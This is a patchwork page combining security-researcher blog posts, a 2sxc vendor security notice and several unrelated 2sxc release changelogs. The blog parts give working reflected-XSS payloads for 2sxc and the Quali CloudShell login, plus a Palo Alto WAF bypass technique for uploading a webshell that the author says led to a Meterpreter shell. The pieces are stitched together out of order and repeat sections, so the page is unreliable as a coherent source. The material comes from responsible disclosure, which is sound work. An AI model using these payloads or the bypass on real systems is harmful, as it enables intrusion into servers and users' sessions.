### CVE-2020-26885 - XSS in 2SXC

Reflected XSS via the sxcver parameter on the /DesktopModles/tosic\_sexycontent/dist/dnn/ui.html page by using the payload:

"><IMG%20SRC=%23%20onerror="alert('xss')">

2SIC was very fast to respond and super great to work with! This has been remediated with this update here: (<https://github.com/2sic/eav-item-dialog-angular/blob/develop/projects/ng-dialogs/src/index.html#L33-L42>) and they published a helpful notice on their blog here: (<https://2SXC.org/en/blog/post/2sxc-security-notification-2021-001>)

### [CVE-2020-26885 XSS in Anchor Tags](https://burninatorsec.blogspot.com/2020/10/cve-2020-26885-xss-in-anchor-tags.html)

For CVE-2020-26885, the AWS WAF made it difficult to get XSS payloads through to the server, but I was able to rely on the client to execute one by using the anchor tag in the URL to exploit it:

/test.html#variable1=true&app=3&version=">IMG%20SRC=%23%20onerror="alert('burninatorsec')">

### [CVE-2020-15864 - XSS in Quali CloudShell Login](https://burninatorsec.blogspot.com/2020/10/cve-2020-xxxxx-xss-in-quali-cloudshell.html)

Payload:

**{{constructor.constructor(%27alert(19891337)%27)()}**

Add "username" as a parameter to the login URL to reference the username field of the Quali CloudShell login page, and the JavaScript will execute when they visit the URL, i.e.

**https://victim/Account/Login?ReturnUrl%252fAccount%252f%&username={{constructor.constructor(%27alert(1337)%27)()}}**

Note: <sCript>alert(1337)<scRipt> works too, but isn't as dangerous because it won't autoload through the URL like the constructor payload does.

# 2sxc Security Notification 2021-001

4/30/2021

The good news is - this is our first security notification in 9 years 🌟.

The bad news is - this is a security notification 😲.

## TL;DR Summary 2021-001

### 1. Please Update to latest LTS

The key takeaway is that versions 8-11 of 2sxc have security issues; version 11 is especially vulnerable (and really easy to update). You should really update to the latest LTS - at the time of writing this is v11.22. You'll find a direct link in the [download section](/en/download).

### 2. Upgrade Process and Time Estimates

In most cases an upgrade can be completed in 5 minutes. But we recommend that you run an upgrade on a copy before upgrading your live environment, so depending on your setup it will take you longer to get a copy running for upgrade testing.

1. If you have a typical website running 2sxc 11 you can expect it to just-work in just a few minutes.
2. If you are updating from v10 it will usually just work, but there are some minor breaking changes. In most cases the error message will tell you exactly what you should do.
3. If you are upgrading from V7+ or from a website that was originally created using V7 you'll probably still have some Razor templates which may use now unsupported APIs. 2sxc is really keen on stable APIs so in most cases it will work, or it will show you an error as to exactly what you should do. But in this scenario plan with 1-2 hours of upgrade work per portal.
4. If you have *custom* DataSources from v8, v9 or v10 you'll need to update them. There is [extensive new documentation](https://docs.2sxc.org/net-code/data-sources/custom/index.html) as to how they work now, so it should be easy to do. Plan 1-2 hours per DataSource.

*Note that our estimate time is pure developer time. If you need to make a customer quote you should at least double this estimate for PM and overhead. If it's your first upgrade ever estimate it 4x higher since the first time just takes longer.*

For more details please check the [breaking changes documentation](https://docs.2sxc.org/basics/internal/progress/breaking-changes.html).

## Security Notification 2021-001

A few months ago the penetration tester [burninatorsec](https://burninatorsec.blogspot.com/) discovered a security vulnerability in 2sxc. They contacted us and we were able to confirm the issue. Together we worked out a roadmap to first release another LTS before publishing the issue.

> A big thanks to the burninatorsec for helping and giving us enough time to resolve the issue before creating a public announcement!

Everybody will usually want to know as much as possible to make a decision upgrade or not, yet the more we disclose, the more likely it would become that people would abuse it.

### What is it?

> It's a small issue - which can become a large issue.

The issue itself is fairly harmless, but as anybody with security experience will tell you - small issues can lead to suprisingly creative attack vectors. So small gaps will usually lead to something small being changed which will seem harmless until imperfect part of a system does something which will result in a larger hole which will then be used elevate the attackers grasp step-by-step.

So even if it's a small issue and has not been exploited in the wild, please assume that an attacker will be able to do a lot of damage - at least take the system down, possibly even extract data. If your DNN is older, he may even be able to capture the entire server and encrypt it.

### Affected Versions

* v11.22 LTS is *not* affected
* 2sxc v8 till v11 are all affected
* 2sxc v11 releases have the highest risk - and they are the easiest to update

### Non-Affected Versions or Mitigating Circumstances

* 2sxc releases before 8 are not affected according to our research
* If your DNN is not accessible on the internet (pure intranet use) it is not affected
* As of April 2021 we have no reports of this issue being abused

## Stay Safe!

Love from Switzerland,
Daniel

PS: Don't panic 😉. This issue has never been abused as far as we know. But we take security really serious, which is why we're communicating this so strongly.

PPS: It's really not that hard - here's what Aaron wrote a few hours after we announced this:

### Major

1. Implemented system to use the `As<...>` API with interfaces, which will automatically find the right class to instantiate
2. Created new `DataModel` system in the `Models` and `Data.Model` namespace [#3543](https://github.com/2sic/2sxc/issues/3543)
3. Created data model for `IFileModel` and `IFolderModel` which matches the entities returned by the `AppAssets` DataSource
4. Created data model for `IUserModel` and `IUserRoleModel` which matches entities returned by the `Users` and `UserRoles` DataSource
5. Renamed `Roles` DataSource to `UserRoles` (could be breaking change for very few users)
6. Created data model `ISiteModel` which matches data returned by the `Sites` DataSource
7. created data model `IPageModel` which matches data returned by `Pages` DataSource
8. Finished the `ICacheService` on `Kit.Cache` [#3536](https://github.com/2sic/2sxc/issues/3536)
9. Finished the `AppAssets` Datasource and documented it [#3541](https://github.com/2sic/2sxc/issues/3541)
10. Changed `System.Text.Json` to use .net 9 [#3547](https://github.com/2sic/2sxc/issues/3547)
11. Upgraded to Oqtane 6+ so it's only compatible with Oqtane 6.0.1+ now [#3548](https://github.com/2sic/2sxc/issues/3548)

### Bugs

1. 🩸 Oqtane bugs with JavaScripts due to changes in Oqtane 6.0 and 6.0.1 - affected `Interactive` mode [#3533](https://github.com/2sic/2sxc/issues/3533)
2. Minor bugfixes in new `AppAssets` DataSource
3. Site Settings and Global Settings could not be accessed [#3534](https://github.com/2sic/2sxc/issues/3534)

### Minor

1. Fix some inconsistencies in the GPS UI
2. Minor update Google Maps API to latest (was using old API before)
3. Edit UI: Replaced Time Picker with new Time Picker from Angular Material
4. Improved Custom DataSource so you can access the `List` and `GetStream(...)` [#3540](https://github.com/2sic/2sxc/issues/3540)

### Internal

1. Reworked how save-options for entities are handled, cleaned old internal imperfect implementation
2. Refactored internal Entities data to use `record` instead of `class` (improves cloning) [#3542](https://github.com/2sic/2sxc/issues/3542)
3. Start architecture for a Task-system to run things [#3545](https://github.com/2sic/2sxc/issues/3545)

### Possibly breaking changes

1. DataSource `Roles` renamed to `UserRoles` - this won't affect queries, but it could affect code
2. DataSource `Pages` renamed 2 properties because of inconsistencies `Visible` to `IsNavigation` and `Clickable` to `IsClickable` [#3544](https://github.com/2sic/2sxc/issues/3544)

[2sxc 19 with new Pickers and way more](/2sic/2sxc/releases/tag/v19.00.00)

## Highlights

1. Finally released new EPIC picker system [#3530](https://github.com/2sic/2sxc/issues/3530) with things such as radio buttons and checkboxes [#3179](https://github.com/2sic/2sxc/issues/3179) preview features for svgs, icons and images; data-sources for App-Assets and more.
2. Created major improvements around URL parameters because of AI crawlers [#3520](https://github.com/2sic/2sxc/issues/3520) [#3521](https://github.com/2sic/2sxc/issues/3521) [#3522](https://github.com/2sic/2sxc/issues/3522)
3. New feature to double-encrypt HTTP Post body to prevent CDN Snooping [#3518](https://github.com/2sic/2sxc/issues/3518)
4. Language Features in UI so the user can select alternate language labels & buttons
5. Ability to delete entity-fields on content-types when the data still had relationships (old task) [#1378](https://github.com/2sic/2sxc/issues/1378)

## Minor & Chores

1. Updated UI to Angular 19 and moving most code to using Signals instead of RxJS [#3527](https://github.com/2sic/2sxc/issues/3527)
2. Enhanced GPS fields with "my location" and custom search capabilities
3. Not a bug, but we removed an old, probably never user API called `IBlockInstance` (was the same as `IDataSource`)

## Bugfixes

1. Validation on pickers caused some trouble [#3525](https://github.com/2sic/2sxc/issues/3525)
2. Error shown on public forms because of some API being accessed for settings which wasn't needed [#3477](https://github.com/2sic/2sxc/issues/3477)

[2sxc 18.03](/2sic/2sxc/releases/tag/v18.03)

## Major Work

1. Image Service / `.Picture(...)`, `.Img(...)` etc. now have a tweak API [#3493](https://github.com/2sic/2sxc/issues/3493)
2. ...which now also allows you to configure Lightbox parameeters [#3492](https://github.com/2sic/2sxc/issues/3492)
3. This was also extended for the `ITypedItem.Picture(...)` and `...Img(...)`
4. Pickers were further improved, almost final...
5. Improved and tested to work with DNN 10 for new Permissions and Workflow 🕺🏽
6. Working on releasing **Data Bundles** export/import (still beta)
7. Working on user language settings, so that they can specify that labels remain in another language
8. **TemplateService** now officially released.

## Enhancements

1. Files generated by the CoPilot previously contained a timestamp, this is replaced with a log file for better git-merge [#3485](https://github.com/2sic/2sxc/issues/3485)
2. Token LookUp improved to allow custom value processing for HTML parsing etc. [#3490](https://github.com/2sic/2sxc/issues/3490) [#3491](https://github.com/2sic/2sxc/issues/3491) [#3497](https://github.com/2sic/2sxc/issues/3497)
3. ImageService now better handles custom attributes, so that `loading=lazy` can be overruled [#3494](https://github.com/2sic/2sxc/issues/3494)
4. Internal schemal for DataSources improved for ContentTypes and AppAssets (very technical) [#3488](https://github.com/2sic/2sxc/issues/3488)
5. DataSource `Metadata Targets` can now also supply Content-Type Targets
6. When creating a new view, the new default is `RazorTyped`
7. Item History improved, so it shows the current users Time Zone (previously GMT)
8. Many Admin-UIs now support Ctrl+Click
9. DataSource to define entity-serialization was extended to also show type-information like the Type-Name

## Bugfixes

1. Various bugfixes related to the picker
2. Html(...) method which used template engine caused HTML encoding [#3497](https://github.com/2sic/2sxc/issues/3497)
3. TemplateService - safe HTML now only encodes values it replaces, not entire string [#3491](https://github.com/2sic/2sxc/issues/3491)
4. Formulas sometimes didn't correctly *stop* [#3498](https://github.com/2sic/2sxc/issues/3498)
5. Modules inside Skins/Themes caused unexpected edit behavior for users with reduced edit rights [#3380](https://github.com/2sic/2sxc/issues/3380)
6. Code Editor - snippet titles were missing [#3481](https://github.com/2sic/2sxc/issues/3481)

## Important / Breaking Changes

1. We removed an old, unused table called `ToSIC_EAV_AttributeGroups` and relationships to it
2. ...this won't break any 2sxc, but if you had any custom SQL you may need to adjust it
3. ...it also means that you won't be able to easily go back to a previous version of 2sxc, as the DB has changes

[2sxc 18 with loads of new stuff ;)](/2sic/2sxc/releases/tag/v18.00.00)

## Highlights

1. 🩸 Runs on Oqtane 5.1.2 with Static Server Rendering 💪🏼
2. 🖼️ Image Service: Ability to specify lightbox on images through image configuration
3. 🖼️ Image Service: Ability to specify resize-settings (eg. Square) per image through configuration
4. 🖼️ Image Service: Ability to specify resize/lightbox defaults on the content-type field!
5. 📝 WYSIWYG: Ability to configure image resize and lightbox for all images in API, on every image and on the field!
6. 🔬 Typed API now supports a `Get(...)` method which you can use to retrieve values in other languages
7. 🔍 Insights: many, many improvements incl. better display of load-time progress, memory use and more
8. ⚡ LightSpeed: ability to configure per view and improved selection of url parameters which affect the cache
9. 📝 WYSIWYG Rich mode: New image sizes 1/6th and 1/8th
10. ⚙️ New Template Service released, and optimized to clean any html, to prevent XSS
11. ⚡ Lots of performance improvements on the server for typed 🔬 code and also in the Edit UI making initial load faster

## Important

1. In sub-views (list-details where the details was shown because of a URL parameter) the toolbar disables change-view
2. DataSource `Parents` and `Children` now properly filter out draft parents/children if the user is not allowed to see it [#3438](https://github.com/2sic/2sxc/issues/3438)
3. 🔛 turnOn updated to v0.3.0 with new `args` parameter to easily call existing JS libraries
4. 🔳 Toobar buttons - Tweak now has a `Condition(true/false)` and `Condition(fn)` to make buttons conditional eg. for certain user groups only.
5. ✏️ Major rework on all dropdowns, so that the picker system is *almost* done ;)

## Minor

1. Visual Query improved to slant labels if there were too many
2. Toolbar positioning CSS improved using flex
3. Bug: older Apps had a problem loading fancybox JS [#3424](https://github.com/2sic/2sxc/issues/3424)
4. 🔬 Bug: Sub-Items toolbars didn't work in typed mode, affected Slider App [#3437](https://github.com/2sic/2sxc/issues/3437)
5. 🔍 Insights show what's in the cache and memory use (estimates)
6. 🏷️ Metadata: provide recommendations for Entity-Attributes, needed for the Image-Per-Field-Configuration [#3430](https://github.com/2sic/2sxc/issues/3430)

## Chores

1. 🔒 Updated System.Text.Json to 8.0.4 as it contains a security issue. The issue didn't affect 2sxc, but the warnings did ;)
2. 🔍 Refactor internal system to use provider model
3. Make the `MyUser` / `CmsContext.User` objects serializable for use in JSON
4. ✏️ Update Edit UI / Admin UI to Angular 17.03
5. ✏️ Massively refactor Edit/Admin UIs to use signals instead of observables and `transient` services for robustness
6. ✏️ Refactor Admin UIs to simplify Ag-Grid table and column definitions
7. ✏️ Refactor language handling in Edit/Admin UI

### [Palo Alto Networks - WAF Bypass for Webshell](https://burninatorsec.blogspot.com/2020/11/palo-alto-networks-waf-bypass-for.html)

I originally found/reported to Palo Alto in 2018.

You can use the default Kali Linux aspx webshell to get RCE on a server protected by Palo Alto Networks... as long as you change the "m" in cmd.exe to an "M".

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHV_3fDeNOR50IF19Qx_tj0HrCZoFUQ-LPMmW4TDc7xpUBXSa7OIxzRFGUR8HkXwl5DcKDqaFipW15Guc1iCdahJpUZdvfG116bwQKjrCfiblyXSD2VTVNhR2lbXpweZSliYlIQe14PCw/w400-h183/image002.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHV_3fDeNOR50IF19Qx_tj0HrCZoFUQ-LPMmW4TDc7xpUBXSa7OIxzRFGUR8HkXwl5DcKDqaFipW15Guc1iCdahJpUZdvfG116bwQKjrCfiblyXSD2VTVNhR2lbXpweZSliYlIQe14PCw/s676/image002.jpg)

That's it! That's the whole hack..! It bypasses the whitelist.

So my discovery process...

While I was trying to upload my webshell, I noticed the font of the error looked different than the rest of the application. I googled the wording, trying to figure out what service was displaying it. It looked similar to an image of a Palo Alto dialog:

Mine:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjatNBv5rYOP0ud0Grj08wKer4yFrukxucwoa9gjzy-UpQZhvnAZgtfHOqDsV2DhQ3QYwsOMseNsCGuLxVriluZAYM06bEF6OIj9ZmYy3w5AbWZFHQ4nloepJqAiDoI9GsnSZe1gtD2f4c/w400-h175/image005.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjatNBv5rYOP0ud0Grj08wKer4yFrukxucwoa9gjzy-UpQZhvnAZgtfHOqDsV2DhQ3QYwsOMseNsCGuLxVriluZAYM06bEF6OIj9ZmYy3w5AbWZFHQ4nloepJqAiDoI9GsnSZe1gtD2f4c/s626/image005.png)

Theirs:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8K-YEc4OIjIT4MFaM4o4mtCat6BKzPwWZeEUADX-hdEwvxoUkSXxUWHdJpoAcMBbNG6C90tXxmZeBr5uxHHwaQ9zADfttJFtLqjiMUbWFmGPyrFJRoBbzQWsdVVnjbDCROTANtXekuhY/w400-h141/image004.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8K-YEc4OIjIT4MFaM4o4mtCat6BKzPwWZeEUADX-hdEwvxoUkSXxUWHdJpoAcMBbNG6C90tXxmZeBr5uxHHwaQ9zADfttJFtLqjiMUbWFmGPyrFJRoBbzQWsdVVnjbDCROTANtXekuhY/s1221/image004.jpg)

Close enough - I assumed I was
dealing with a Palo Alto firewall.
The logs confirmed this was true. The bypass worked and eventually I upgraded my webshell to a Meterpreter shell. The Palo Alto WAF bypass process wasn't fancy, but it was instrumental in owning the server.

### CVE-2020-26885 XSS in Anchor Tags

For CVE-2020-26885, the AWS WAF made it difficult to get XSS payloads through to the server, but I was able to rely on the client to execute one by using the anchor tag in the URL to exploit it:

/test.html#variable1=true&app=3&version=">IMG%20SRC=%23%20onerror="alert('burninatorsec')">
